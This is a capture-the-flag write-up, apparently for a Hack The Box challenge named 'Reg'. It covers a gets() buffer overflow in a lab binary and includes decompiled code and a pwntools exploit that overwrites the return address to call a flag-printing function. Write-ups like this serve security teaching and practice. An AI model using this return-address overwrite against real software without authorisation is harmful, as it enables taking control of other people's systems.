# Reg
When ran, the binary prompts for your name and returnes "Registered!". Static analysis is necessary to understand the binary's underlying functionality.
## Static Analysis

```c
void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);         [1]
  puts("Registered!");
  return;
}
```

```c
void winner(void)

{
  char local_418 [1032];
  FILE *local_10;
  
  puts("Congratulations!");
  local_10 = fopen("flag.txt","r");
  fgets(local_418,0x400,local_10);
  puts(local_418);
  fclose(local_10);
  return;
}
```
### Vulnerability
`gets()` [1] stores characters past the end of the buffer, which results in a buffer overflow vulnerability.


## Exploitation
An exploit was created in Python with pwntools library to overflow past the buffer of `local_38` and `rbp` into `rip` with the address of the `winner()` function which opens the flag.txt file.

**Creating the pwntools template:**
```bash
pwn template --host 300.300.300.300 --port 1234 ./reg >> solution.py
```
**Pwntools exploit:**
```python
io = start()
padding = b"A"*56 #56 bytes of padding to overflow past rbp into rip
flagfunc = p64(exe.symbols["winner"],endian="little") #the address of the winner function
io.recvuntil(b"name :") #stop at prompt
io.sendline(padding+flagfunc) #send padding and winner function address to call flag function
```
The exploit is then ran against the live challenge IP address and port number.

`./solution.py HOST=[ip address] PORT=[port]`

**Result:**
```txt
[*] Switching to interactive mode
 Registered!
Congratulations!
HTB{[flag]}
```